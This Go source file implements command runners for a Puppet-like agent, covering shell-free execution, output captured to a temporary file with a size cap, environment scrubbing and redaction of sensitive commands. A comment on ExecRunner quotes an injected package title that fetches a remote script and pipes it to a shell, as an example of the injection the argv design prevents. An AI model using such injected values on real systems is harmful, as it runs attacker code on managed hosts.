package command

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"slices"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf8"

	"github.com/voxagent/voxagent/internal/lib/rubyvalue"
	"github.com/voxagent/voxagent/internal/lib/sources"
	"github.com/voxagent/voxagent/internal/runlog"
)

// FileOutputRunner is the Runner service uses. It and ExecRunner share
// RunArgv: for both, the command's stdout and stderr are a temporary file, not
// a pipe.
//
// A pipe's reader sees EOF only when every holder of the write end has closed
// it, and a process the command backgrounds inherits that end. So a custom
// start of `/opt/app/run &` would keep CombinedOutput waiting for as long as
// the daemon lives. Puppet returns as soon as the command it started exits:
// on POSIX it reads a pipe and polls the child with WNOHANG between
// non-blocking reads, "in case the child forks and inherits stdout, as happens
// in `foo &`" (util/execution.rb:236-258), and elsewhere it writes the output
// to a Uniquefile (:202). With a file, Wait likewise returns when the direct
// child exits.
//
// What a backgrounded daemon's LATER output meets differs, and is divergence
// D-24. Puppet stops reading after its final non-blocking read (:260-267) and
// closes the pipe's read end (:325), so the daemon's next write to stdout gets
// EPIPE, and SIGPIPE kills it unless it ignores the signal. Here the daemon
// holds a descriptor for the temporary file instead: run removes the file's
// name once it has read the output, the open descriptor keeps the file itself
// alive, and later writes succeed into a file nobody reads.
//
// Neither a process-group kill nor a WaitDelay that closes the pipe is an
// alternative: the first kills the service just started, and the second gives
// it the same closed pipe Puppet does, while voxagent is still waiting on it.
//
// The contract is ExecRunner's: a non-zero exit is a value, and only a command
// that cannot start (or whose output cannot be captured) is an error.
type FileOutputRunner struct{}

// Run implements Runner.
func (FileOutputRunner) Run(ctx context.Context, name string, args ...string) (int, string, error) {
	return RunArgv(ctx, name, args...)
}

// redactCommandKey marks a context whose commands name a value Sensitive
// marks, so the runners log them in Ruby's redacted forms (D-78).
type redactCommandKey struct{}

// WithRedactedCommands returns ctx marking every command run under it as
// naming a marked value. The Runner interface has no room for a flag,
// so the caller that composes the argv says so here.
func WithRedactedCommands(ctx context.Context) context.Context {
	return context.WithValue(ctx, redactCommandKey{}, true)
}

// RunArgv is the body of both argv runners: it runs name and args with no
// shell through RunLogged, showing the command as '[redacted]' in the
// Executing line and as [command redacted] in the truncation warning when ctx
// is marked by WithRedactedCommands.
func RunArgv(ctx context.Context, name string, args ...string) (int, string, error) {
	line := strings.Join(append([]string{name}, args...), " ")
	redact, _ := ctx.Value(redactCommandKey{}).(bool)
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.Env = WithoutUserEnv(os.Environ())
	return RunLogged(ctx, cmd, QuoteOrRedact(line, redact), rubyvalue.RedactIf(redact, "%s", line))
}

// RubyLocaleVars is util/posix.rb:6-7's LOCALE_ENV_VARS: the variables Puppet
// deletes in the child, which util/execution.rb:372-379 then replaces with
// LANG=C and LC_ALL=C.
var RubyLocaleVars = []string{
	"LANG", "LC_ALL", "LC_MESSAGES", "LANGUAGE", "LC_COLLATE",
	"LC_CTYPE", "LC_MONETARY", "LC_NUMERIC", "LC_TIME",
}

// ArgvOpts shapes one RunArgvWith command.
type ArgvOpts struct {
	// Stdin is the child's standard input; nil is an empty input.
	Stdin []byte
	// Redact shows the command as '[redacted]' in the Executing line and as
	// [command redacted] in the truncation warning: its argv or Stdin names a
	// value that must not reach a log, such as a password hash.
	Redact bool
}

// RunArgvWith is RunArgv for a command Puppet runs through Puppet::Util::
// Execution.execute with the locale override (util/execution.rb:372-377): the
// locale variables are removed and LANG=C, LC_ALL=C set, so a tool's messages
// are the C locale's. o gives its stdin and whether it is logged redacted.
func RunArgvWith(ctx context.Context, o ArgvOpts, name string, args ...string) (int, string, error) {
	line := strings.Join(append([]string{name}, args...), " ")
	cmd := exec.CommandContext(ctx, name, args...)
	env := WithoutUserEnv(os.Environ())
	cmd.Env = make([]string, 0, len(env)+2)
	for _, kv := range env {
		varName, _, _ := strings.Cut(kv, "=")
		if !slices.Contains(RubyLocaleVars, varName) {
			cmd.Env = append(cmd.Env, kv)
		}
	}
	cmd.Env = append(cmd.Env, "LANG=C", "LC_ALL=C")
	if o.Stdin != nil {
		cmd.Stdin = bytes.NewReader(o.Stdin)
	}
	return RunLogged(ctx, cmd, QuoteOrRedact(line, o.Redact), rubyvalue.RedactIf(o.Redact, "%s", line))
}

// ShadowRunner is how the user and group providers run shadow-utils commands;
// tests substitute a fake.
type ShadowRunner interface {
	Run(ctx context.Context, o ArgvOpts, name string, args ...string) (int, string, error)
}

// HostShadowRunner runs the command on the host through RunArgvWith.
type HostShadowRunner struct{}

// Run implements ShadowRunner.
func (HostShadowRunner) Run(ctx context.Context, o ArgvOpts, name string, args ...string) (int, string, error) {
	return RunArgvWith(ctx, o, name, args...)
}

// ExecFailure is the Puppet::ExecutionFailure for a command that exited with
// code (util/execution.rb:312). cmd is joined by single spaces, so an empty
// element leaves a double space; redact shows it as [redacted] (:162).
func ExecFailure(cmd []string, redact bool, code int, output string) error {
	return &ExecutionFailure{Command: rubyvalue.RedactIf(redact, "%s", strings.Join(cmd, " ")), Status: code, Output: output}
}

// maxCommandOutput caps the output kept from one command, so a command that
// floods its output cannot exhaust the agent's memory (D-80). Puppet keeps all
// of it.
const maxCommandOutput = 64 << 20

// OutputCap is maxCommandOutput; tests lower it.
var OutputCap = maxCommandOutput

// RunLogged is RunCapped for a command that is new to the run: it first logs
// Ruby's debug line for the execution, once per command (util/execution.rb:181,
// source Puppet). executing is the command as Ruby's command_str has it, the
// words joined by a space, or "[redacted]" when Sensitive marks the command
// (rubyvalue.RedactIf), which Ruby shows as '[redacted]' (:162). Every command runner
// comes through here, so validate_cmd, Package, Service and SELinux commands
// all log it, and Exec logs it itself before runExec; a retry of the same
// command (ENOEXEC) goes to RunCapped or runExec and does not log it again.
func RunLogged(ctx context.Context, cmd *exec.Cmd, what, executing string) (int, string, error) {
	runlog.Debugf(ctx, "Puppet", "Executing: '%s'", executing)
	return RunCapped(ctx, cmd, what, (*exec.Cmd).Run)
}

// RunCapped is runCapturingToFile for a caller that has a context: when the
// output was cut it logs the D-80 warning, which is never a failure. what is
// the string runCapturingToFile gets, so a command Sensitive marks stays
// redacted. Type-wide prefetch runs with no resource in the context, so the
// warning then has no reference prefix. run is runCapturingToFile's.
func RunCapped(ctx context.Context, cmd *exec.Cmd, what string, run func(*exec.Cmd) error) (int, string, error) {
	code, out, truncated, err := runCapturingToFile(cmd, what, run)
	if truncated {
		msg := fmt.Sprintf("output of %s truncated at 64 MiB", what)
		if ref := sources.SourcesFrom(ctx).Ref; ref != "" {
			msg = ref + ": " + msg
		}
		runlog.From(ctx).Log("warning", "voxagent", msg)
	}
	return code, out, err
}

// runCapturingToFile runs cmd with its stdout and stderr on a temporary file,
// for the reason FileOutputRunner gives, and returns the exit status and the
// combined output. Exec.execute uses it too: an exec command that backgrounds
// a process meets the same pipe. cmd's Stdout and Stderr are overwritten;
// what is the command as errors name it, quoted or redacted (QuoteOrRedact).
//
// At most OutputCap bytes of output are kept (cutOutput); truncated says the
// command wrote more. The command still runs to its end and its exit status is
// reported as usual. Callers report the truncation through RunCapped.
//
// run runs cmd to its end, (*exec.Cmd).Run or runExec's timed wait. An error
// from it other than an *exec.ExitError is returned with no output: the
// command did not start, or it was given up on (runExec), and Ruby discards
// the output of a timed-out command.
func runCapturingToFile(cmd *exec.Cmd, what string, run func(*exec.Cmd) error) (code int, out string, truncated bool, err error) {
	f, err := os.CreateTemp("", "voxagent-output-")
	if err != nil {
		return 0, "", false, fmt.Errorf("run %s: capture output: %w", what, err)
	}
	defer os.Remove(f.Name())
	defer f.Close()

	cmd.Stdout = f
	cmd.Stderr = f
	runErr := run(cmd)
	var ee *exec.ExitError
	if runErr != nil && !errors.As(runErr, &ee) {
		return 0, "", false, fmt.Errorf("run %s: %w", what, runErr)
	}

	if _, err := f.Seek(0, io.SeekStart); err != nil {
		return 0, "", false, fmt.Errorf("run %s: read output: %w", what, err)
	}
	// One byte past the cap tells output of exactly the cap from longer output.
	all, err := io.ReadAll(io.LimitReader(f, int64(OutputCap)+1))
	if err != nil {
		return 0, "", false, fmt.Errorf("run %s: read output: %w", what, err)
	}
	kept, truncated := cutOutput(all, OutputCap)
	if ee != nil {
		return ee.ExitCode(), string(kept), truncated, nil
	}
	return 0, string(kept), truncated, nil
}

// cutOutput returns b unchanged when it is at most max bytes. Otherwise it
// returns the longest prefix of b[:max] that ends at a line break, or, when
// that has none, at a complete UTF-8 sequence, so that what is kept decodes
// when the output did.
func cutOutput(b []byte, max int) (kept []byte, truncated bool) {
	if len(b) <= max {
		return b, false
	}
	kept = b[:max]
	if i := bytes.LastIndexByte(kept, '\n'); i >= 0 {
		return kept[:i+1], true
	}
	// The last rune starts at most UTFMax-1 bytes back; drop it if it is cut.
	for back := 1; back < utf8.UTFMax && back <= len(kept); back++ {
		if utf8.RuneStart(kept[len(kept)-back]) {
			if !utf8.FullRune(kept[len(kept)-back:]) {
				kept = kept[:len(kept)-back]
			}
			break
		}
	}
	return kept, true
}

// QuoteOrRedact is how a command appears in an error: quoted, or
// [command redacted] when a marked parameter carries it.
func QuoteOrRedact(s string, redact bool) string {
	if redact {
		return "[command redacted]"
	}
	return "'" + s + "'"
}

// Executable is File.executable?, which is eaccess(2): any execute bit for
// an effective uid of 0, else faccessat(2) with X_OK checked against the
// EFFECTIVE uid and gid (AT_EACCESS), not access(2)'s real ones.
func Executable(path string, fi fs.FileInfo) bool {
	if os.Geteuid() == 0 {
		return fi.Mode().Perm()&0o111 != 0
	}
	// Linux's values, which package syscall does not export: <fcntl.h>
	// AT_FDCWD and AT_EACCESS, <unistd.h> X_OK. syscall.Faccessat honours the
	// flag through faccessat2, or emulates it from fstatat on older kernels.
	const atFDCWD, atEACCESS, xOK = -100, 0x200, 0x1
	return syscall.Faccessat(atFDCWD, path, xOK, atEACCESS) == nil
}

// ExecutableFile is which's FileTest.file? && FileTest.executable?.
func ExecutableFile(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && fi.Mode().IsRegular() && Executable(path, fi)
}

// UserEnvVars are the variables Puppet removes from every child
// (util/posix.rb:11's USER_ENV_VARS, applied at util/execution.rb:386).
var UserEnvVars = []string{"HOME", "USER", "LOGNAME"}

// WithoutUserEnv returns environ without the UserEnvVars.
func WithoutUserEnv(environ []string) []string {
	out := make([]string, 0, len(environ))
	for _, kv := range environ {
		name, _, _ := strings.Cut(kv, "=")
		if !slices.Contains(UserEnvVars, name) {
			out = append(out, kv)
		}
	}
	return out
}

// SplitOutput is Ruby's String#split(/\n/): split on "\n", trailing empty
// strings removed, interior ones and "\r" kept. Empty output, or only
// newlines, gives no lines.
func SplitOutput(out string) []string {
	lines := strings.Split(out, "\n")
	for len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1]
	}
	if len(lines) == 0 {
		return nil
	}
	return lines
}

// ExecutionFailure is Puppet::ExecutionFailure as util/execution.rb:311-312
// raises it. It is a Puppet::Error, so the ensure setter re-raises it
// unwrapped (property.rb:490), like checksumMismatchError.
type ExecutionFailure struct {
	Command string
	// Status is the exit status, or -1 for a process killed by a signal,
	// whose Ruby exitstatus is nil and interpolates as nothing.
	Status int
	Output string
}

func (e *ExecutionFailure) Error() string {
	status := ""
	if e.Status >= 0 {
		status = strconv.Itoa(e.Status)
	}
	// String#strip: Ruby 3.4 takes NULs as well as whitespace from both ends.
	return fmt.Sprintf("Execution of '%s' returned %s: %s", e.Command, status, strings.Trim(e.Output, " \t\n\v\f\r\x00"))
}

// Runner runs one command and reports its exit status, its combined
// output, and whether the command could be run at all.
//
// A NON-ZERO EXIT IS A VALUE, NOT AN ERROR. Only a failure to start or to wait
// is an error. This is not a stylistic echo of Exec.execute: `dnf check-update`
// uses exit 100 to mean "updates are available" and exit 0 to mean "none are",
// so a runner that folded non-zero into err would turn the single most
// informative answer dnf gives into a failure.
//
// It is an interface so the policy above it can be tested without a package
// manager present -- which is the whole reason this seam is separate from the
// provider.
type Runner interface {
	Run(ctx context.Context, name string, args ...string) (exitCode int, output string, err error)
}

// ExecRunner is the Runner that actually executes commands.
type ExecRunner struct{}

// Run implements Runner.
//
// NO SHELL. Unlike Exec.execute, which must use `/bin/sh -c` because Puppet's
// exec semantics are defined in terms of a shell, this passes argv directly to
// exec.CommandContext. That is a SECURITY PROPERTY, not a style preference:
// package names arrive from a catalog, so a shell here would make `ensure =>
// present` on a crafted title such as `tree; curl evil.sh | sh` a command
// injection. In argv form a crafted name is one argument that dnf rejects.
//
// No process group is set up, again unlike Exec.execute: there is no shell to
// outlive, so CommandContext's kill reaches the command itself.
//
// Output goes to a temporary file capped at maxCommandOutput, with the D-80
// warning when cut (RunCapped); the exit-code and error contract is unchanged.
func (ExecRunner) Run(ctx context.Context, name string, args ...string) (int, string, error) {
	return RunArgv(ctx, name, args...)
}
